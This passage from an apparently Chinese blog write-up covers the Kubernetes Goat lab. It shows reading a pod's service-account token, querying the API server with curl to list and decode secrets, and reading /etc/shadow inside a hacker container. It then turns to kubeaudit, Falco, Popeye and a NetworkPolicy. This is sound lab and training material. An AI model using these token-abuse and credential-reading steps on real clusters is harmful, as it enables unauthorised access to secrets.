[16:40:10]</span><br><span class="line">$ ls</span><br><span class="line">secret.txt</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/root [16:40:12]</span><br><span class="line">$ cat secret.txt </span><br><span class="line">k8s-goat-3b7a7dc7f51f4014ddf3446c25f8b772</span><br></pre></td></tr></table></figure>
+
+<h1 id="RBAC-最低权限配置错误"><a href="#RBAC-最低权限配置错误" class="headerlink" title="RBAC 最低权限配置错误"></a>RBAC 最低权限配置错误</h1><p>在 Kubernetes 早期，没有 RBAC（role-based access control，基于角色的访问控制）这样的概念，主要使用 ABAC（attribute-based access control，基于属性的访问控制）。现在它拥有像 RBAC 这样的超能力来实现最小权限的安全原则。尽管如此，有时权限还是给多了。</p>
+<p>目标挑战是查找k8svaultapikey </p>
+<p>默认情况下，Kubernetes 将所有令牌和服务帐户信息存储在<code>/var/run/secrets/kubernetes.io/serviceaccount/</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@hunger-check-deployment-56d65977f6-k68g9:/# cd /var/run/secrets/kubernetes.io/serviceaccount/</span><br><span class="line">root@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# ls -la</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwt 3 root root  140 Jun 24 08:50 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Jun 16 02:55 ..</span><br><span class="line">drwxr-xr-x 2 root root  100 Jun 24 08:50 ..2022_06_24_08_50_43.045810252</span><br><span class="line">lrwxrwxrwx 1 root root   31 Jun 24 08:50 ..data -&gt; ..2022_06_24_08_50_43.045810252</span><br><span class="line">lrwxrwxrwx 1 root root   13 Jun 16 02:53 ca.crt -&gt; ..data/ca.crt</span><br><span class="line">lrwxrwxrwx 1 root root   16 Jun 16 02:53 namespace -&gt; ..data/namespace</span><br><span class="line">lrwxrwxrwx 1 root root   12 Jun 16 02:53 token -&gt; ..data/token</span><br></pre></td></tr></table></figure>
+
+<p>一些目录和地址在环境变量都有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# env | grep SERVICEACCOUNT</span><br><span class="line">SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line">root@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# env | grep KUBERNETES_SERVICE_HOST</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export APISERVER=https://$&#123;KUBERNETES_SERVICE_HOST&#125;</span><br><span class="line">export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line"># 命令空间路径</span><br><span class="line">export NAMESPACE=$(cat $&#123;SERVICEACCOUNT&#125;/namespace)</span><br><span class="line">export TOKEN=$(cat $&#123;SERVICEACCOUNT&#125;/token)</span><br><span class="line">export CACERT=$&#123;SERVICEACCOUNT&#125;/ca.crt</span><br></pre></td></tr></table></figure>
+
+<p>这时我们就可以访问api服务器了，也看得服务器的真实ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api</span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;APIVersions&quot;,</span><br><span class="line">  &quot;versions&quot;: [</span><br><span class="line">    &quot;v1&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;serverAddressByClientCIDRs&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;clientCIDR&quot;: &quot;0.0.0.0/0&quot;,</span><br><span class="line">      &quot;serverAddress&quot;: &quot;192.168.2.174:6443&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查询default命名空间的secrets，可以看到没权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cacert $&#123;CACERT&#125; --header &quot;Athorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/secrets</span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;Status&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;status&quot;: &quot;Failure&quot;,</span><br><span class="line">  &quot;message&quot;: &quot;secrets is forbidden: User \&quot;system:serviceaccount:big-monolith:big-monolith-sa\&quot; cannot list resource \&quot;secrets\&quot; in API group \&quot;\&quot; at the cluster scope&quot;,</span><br><span class="line">  &quot;reason&quot;: &quot;Forbidden&quot;,</span><br><span class="line">  &quot;details&quot;: &#123;</span><br><span class="line">    &quot;kind&quot;: &quot;secrets&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;code&quot;: 403</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看当前命名空间中的secrets</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/secrets</span><br></pre></td></tr></table></figure>
+
+<p>查看当前命名空间中的pods</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/pods</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cacert $&#123;CACERT&#125; --header &quot;Athorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/secrets | grep k8svaultapikey</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  9984    0  9984    0     0   154k      0 --:--:-- --:--:-- --:--:--  154k</span><br><span class="line">          &quot;kubectl.kubernetes.io/last-applied-configuration&quot;: &quot;&#123;\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;data\&quot;:&#123;\&quot;k8svaultapikey\&quot;:\&quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=\&quot;&#125;,\&quot;kind\&quot;:\&quot;Secret\&quot;,\&quot;metadata\&quot;:&#123;\&quot;annotations\&quot;:&#123;&#125;,\&quot;name\&quot;:\&quot;vaultapikey\&quot;,\&quot;namespace\&quot;:\&quot;big-monolith\&quot;&#125;,\&quot;type\&quot;:\&quot;Opaque\&quot;&#125;\n&quot;</span><br><span class="line">            &quot;fieldsV1&quot;: &#123;&quot;f:data&quot;:&#123;&quot;.&quot;:&#123;&#125;,&quot;f:k8svaultapikey&quot;:&#123;&#125;&#125;,&quot;f:metadata&quot;:&#123;&quot;f:annotations&quot;:&#123;&quot;.&quot;:&#123;&#125;,&quot;f:kubectl.kubernetes.io/last-applied-configuration&quot;:&#123;&#125;&#125;&#125;,&quot;f:type&quot;:&#123;&#125;&#125;</span><br><span class="line">        &quot;k8svaultapikey&quot;: &quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>看着是base64</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=&quot; | base64 -d</span><br><span class="line">k8s-goat-85057846a8046a25b35f38f3a2649dce</span><br></pre></td></tr></table></figure>
+
+<p>我们回头来看部署的yaml，可以看到resources直接给了所有resources的get、 watch 和 list权限</p>
+<p><img src="http://pic.giantbranch.cn/pic/1656062712836.png" alt></p>
+<h1 id="KubeAudit-审计-Kubernetes-集群"><a href="#KubeAudit-审计-Kubernetes-集群" class="headerlink" title="KubeAudit - 审计 Kubernetes 集群"></a>KubeAudit - 审计 Kubernetes 集群</h1><p>kubeaudit是一个开源工具，这个工具需要cluster administrator privileges，tiller 这个账户有这个权限，所以指定serviceaccount为tiller启动hacker容器，但是我这没有这个账户，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl run -n kube-system --serviceaccount=tiller --rm --restart=Never -it --image=madhuakula/hacker-container -- bash</span><br><span class="line">Flag --serviceaccount has been deprecated, has no effect and will be removed in the future.</span><br><span class="line">Error from server (Forbidden): pods &quot;bash&quot; is forbidden: error looking up service account kube-system/tiller: serviceaccount &quot;tiller&quot; not found</span><br></pre></td></tr></table></figure>
+
+<p>我觉得本地模式ocal Mode最方便，直接在master下载一个bin，直接运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">$ ./kubeaudit all</span><br><span class="line">W0627 14:19:28.628353   95337 warnings.go:70] v1 ComponentStatus is deprecated in v1.19+</span><br><span class="line">W0627 14:19:32.831222   95337 warnings.go:70] extensions/v1beta1 Ingress is deprecated in v1.14+, unavailable in v1.22+; use networking.k8s.io/v1 Ingress</span><br><span class="line">W0627 14:19:33.253577   95337 warnings.go:70] policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+</span><br><span class="line"></span><br><span class="line">---------------- Results for ---------------</span><br><span class="line"></span><br><span class="line">  apiVersion: v1</span><br><span class="line">  kind: Namespace</span><br><span class="line">  metadata:</span><br><span class="line">    name: big-monolith</span><br><span class="line"></span><br><span class="line">--------------------------------------------</span><br><span class="line"></span><br><span class="line">-- [error] MissingDefaultDenyIngressAndEgressNetworkPolicy</span><br><span class="line">   Message: Namespace is missing a default deny ingress and egress NetworkPolicy.</span><br><span class="line">   Metadata:</span><br><span class="line">      Namespace: big-monolith</span><br><span class="line">	  </span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">---------------- Results for ---------------</span><br><span class="line"></span><br><span class="line">  apiVersion: apps/v1</span><br><span class="line">  kind: Deployment</span><br><span class="line">  metadata:</span><br><span class="line">    name: hunger-check-deployment</span><br><span class="line">    namespace: big-monolith</span><br><span class="line"></span><br><span class="line">--------------------------------------------</span><br><span class="line"></span><br><span class="line">-- [error] AppArmorAnnotationMissing</span><br><span class="line">   Message: AppArmor annotation missing. The annotation &apos;container.apparmor.security.beta.kubernetes.io/hunger-check&apos; should be added.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line">      MissingAnnotation: container.apparmor.security.beta.kubernetes.io/hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] CapabilityOrSecurityContextMissing</span><br><span class="line">   Message: Security Context not set. The Security Context should be specified and all Capabilities should be dropped by setting the Drop list to ALL.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [warning] ImageTagMissing</span><br><span class="line">   Message: Image tag is missing.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [warning] LimitsNotSet</span><br><span class="line">   Message: Resource limits not set.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] RunAsNonRootPSCNilCSCNil</span><br><span class="line">   Message: runAsNonRoot should be set to true or runAsUser should be set to a value &gt; 0 either in the container SecurityContext or PodSecurityContext.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] AllowPrivilegeEscalationNil</span><br><span class="line">   Message: allowPrivilegeEscalation not set which allows privilege escalation. It should be set to &apos;false&apos;.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [warning] PrivilegedNil</span><br><span class="line">   Message: privileged is not set in container SecurityContext. Privileged defaults to &apos;false&apos; but it should be explicitly set to &apos;false&apos;.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] ReadOnlyRootFilesystemNil</span><br><span class="line">   Message: readOnlyRootFilesystem is not set in container SecurityContext. It should be set to &apos;true&apos;.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] SeccompAnnotationMissing</span><br><span class="line">   Message: Seccomp annotation is missing. The annotation seccomp.security.alpha.kubernetes.io/pod: runtime/default should be added.</span><br><span class="line">   Metadata:</span><br><span class="line">      MissingAnnotation: seccomp.security.alpha.kubernetes.io/pod</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">---------------- Results for ---------------</span><br><span class="line"></span><br><span class="line">  apiVersion: batch/v1</span><br><span class="line">  kind: Job</span><br><span class="line">  metadata:</span><br><span class="line">    name: hidden-in-layers</span><br><span class="line">    namespace: default</span><br><span class="line"></span><br><span class="line">--------------------------------------------</span><br><span class="line"></span><br><span class="line">-- [error] AppArmorAnnotationMissing</span><br><span class="line">   Message: AppArmor annotation missing. The annotation &apos;container.apparmor.security.beta.kubernetes.io/hidden-in-layers&apos; should be added.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hidden-in-layers</span><br><span class="line">      MissingAnnotation: container.apparmor.security.beta.kubernetes.io/hidden-in-layers</span><br><span class="line"></span><br><span class="line">-- [error] AutomountServiceAccountTokenTrueAndDefaultSA</span><br><span class="line">   Message: Default service account with token mounted. automountServiceAccountToken should be set to &apos;false&apos; on either the ServiceAccount or on the PodSpec or a non-default service account should be used.</span><br><span class="line"></span><br><span class="line">-- [error] CapabilityOrSecurityContextMissing</span><br><span class="line">   Message: Security Context not set. The Security Context should be specified and all Capabilities should be dropped by setting the Drop list to ALL.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hidden-in-layers</span><br></pre></td></tr></table></figure>
+
+<p>通过查看结果，这个工具会对Namespace、Deployment 、DaemonSet和Job这些类型进行检查。</p>
+<h1 id="Falco-运行时安全监控和检测"><a href="#Falco-运行时安全监控和检测" class="headerlink" title="Falco - 运行时安全监控和检测"></a>Falco - 运行时安全监控和检测</h1><p>需要安装helm v3，安装：<a href="https://helm.sh/docs/intro/install/" target="_blank" rel="noopener">https://helm.sh/docs/intro/install/</a></p>
+<p>将 helm chart 部署到 Kubernetes 集群中，并安装falco </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helm repo add falcosecurity https://falcosecurity.github.io/charts</span><br><span class="line">helm repo update</span><br><span class="line">helm install falco falcosecurity/falco</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># root @ k8s-master  in ~/kubernetes-goat/kubeaudit [14:39:48]</span><br><span class="line">$ helm repo add falcosecurity https://falcosecurity.github.io/charts</span><br><span class="line">&quot;falcosecurity&quot; has been added to your repositories</span><br><span class="line"># root @ k8s-master  in ~/kubernetes-goat/kubeaudit [14:40:12]</span><br><span class="line">$ helm repo update</span><br><span class="line">Hang tight while we grab the latest from your chart repositories...</span><br><span class="line">...Successfully got an update from the &quot;falcosecurity&quot; chart repository</span><br><span class="line">Update Complete. ⎈Happy Helming!⎈</span><br><span class="line"># root @ k8s-master  in ~/kubernetes-goat/kubeaudit [14:42:00]</span><br><span class="line">$ helm install falco falcosecurity/falco</span><br><span class="line">NAME: falco</span><br><span class="line">LAST DEPLOYED: Mon Jun 27 14:50:10 2022</span><br><span class="line">NAMESPACE: default</span><br><span class="line">STATUS: deployed</span><br><span class="line">REVISION: 1</span><br><span class="line">TEST SUITE: None</span><br><span class="line">NOTES:</span><br><span class="line">Falco agents are spinning up on each node in your cluster. After a few</span><br><span class="line">seconds, they are going to start monitoring your containers looking for</span><br><span class="line">security issues.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">No further action should be required.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Tip: </span><br><span class="line">You can easily forward Falco events to Slack, Kafka, AWS Lambda and more with falcosidekick. </span><br><span class="line">Full list of outputs: https://github.com/falcosecurity/charts/tree/master/falcosidekick.</span><br><span class="line">You can enable its deployment with `--set falcosidekick.enabled=true` or in your values.yaml. </span><br><span class="line">See: https://github.com/falcosecurity/charts/blob/master/falcosidekick/values.yaml for configuration values.</span><br></pre></td></tr></table></figure>
+
+<p>Falco 可以检测任何涉及进行 Linux 系统调用的行为并发出警报。Falco 警报可以通过使用特定的系统调用、它们的参数以及调用进程的属性来触发。例如，Falco 可以轻松检测事件，包括但不限于：</p>
+<ul>
+<li>shell 在 Kubernetes 的容器或 pod 中运行。</li>
+<li>容器正在特权模式下运行，或者mount到敏感路径，比如/proc。</li>
+<li>生成意外的子进程。</li>
+<li>意外读取敏感文件，例如/etc/shadow.</li>
+<li>将非设备类型的文件写入/dev.</li>
+<li>标准的系统二进制文件（例如ls）对外网络连接。</li>
+<li>特权 pod 在 Kubernetes 集群中启动。</li>
+</ul>
+<p>查看falco pod的状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods --selector app=falco</span><br></pre></td></tr></table></figure>
+
+<p>从 Falco 系统获取日志</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -f -l app=falco</span><br></pre></td></tr></table></figure>
+
+<p>我们尝试启动一个madhuakula/hacker-container，并读取敏感文件<code>/etc/shadow</code>，看看falco是否会检测到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --rm --restart=Never -it --image=madhuakula/hacker-container -- bash</span><br><span class="line">cat /etc/shadow</span><br><span class="line">vi /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>手动获取的日志因为输出缓存区的原因可能输出会延迟，所以想快点看到结果可以多次执行命令</p>
+<p><img src="http://pic.giantbranch.cn/pic/1656316053753.png" alt></p>
+<h1 id="Popeye-Kubernetes-集群sanitizer"><a href="#Popeye-Kubernetes-集群sanitizer" class="headerlink" title="Popeye - Kubernetes 集群sanitizer"></a>Popeye - Kubernetes 集群sanitizer</h1><p>Popeye 是一个实用程序，可扫描实时 Kubernetes 集群并报告已部署资源和配置的潜在问题。</p>
+<p>能够检测的问题可以查看<a href="https://popeyecli.io/的Sanitizers标题" target="_blank" rel="noopener">https://popeyecli.io/的Sanitizers标题</a></p>
+<p>下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/derailed/popeye/releases/download/v0.10.0/popeye_Linux_x86_64.tar.gz</span><br><span class="line">tar -xvf popeye_Linux_x86_64.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>直接运行二进制文件即可</p>
+<p><img src="http://pic.giantbranch.cn/pic/1656316615122.png" alt></p>
+<p>最后还给你的集群评个分</p>
+<p><img src="http://pic.giantbranch.cn/pic/1656316827296.png" alt></p>
+<h1 id="使用-NSP-保护网络边界"><a href="#使用-NSP-保护网络边界" class="headerlink" title="使用 NSP 保护网络边界"></a>使用 NSP 保护网络边界</h1><p>创建实验环境，启动一个nginx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --image=nginx website --labels app=website --expose --port 80</span><br></pre></td></tr></table></figure>
+
+<p>启动另一个pod尝试访问这个nginx，可以看到可以访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl run --rm -it --image=alpine temp -- sh</span><br><span class="line">If you don&apos;t see a command prompt, try pressing enter.</span><br><span class="line">/ # wget -qO- http://website</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html &#123; color-scheme: light dark; &#125;</span><br><span class="line">body &#123; width: 35em; margin: 0 auto;</span><br><span class="line">font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure>
+
+<p>新建一个Network策略文件<code>website-deny.yaml</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ cat website-deny.yaml </span><br><span class="line">kind: NetworkPolicy</span><br><span class="line">apiVersion: networking.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  name: website-deny</span><br><span class="line">spec:</span><br><span class="line">  podSelector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: website</span><br><span class="line">  ingress: []</span><br><span class="line">``` </span><br><span class="line">应用这个策略</span><br></pre></td></tr></table></figure>
+
+<p>$ kubectl apply -f website-deny.yaml<br>networkpolicy.networking.k8s.io/website-deny created</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再次启动一个临时pod访问</span><br></pre></td></tr></table></figure>
+
+<pre><code></code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
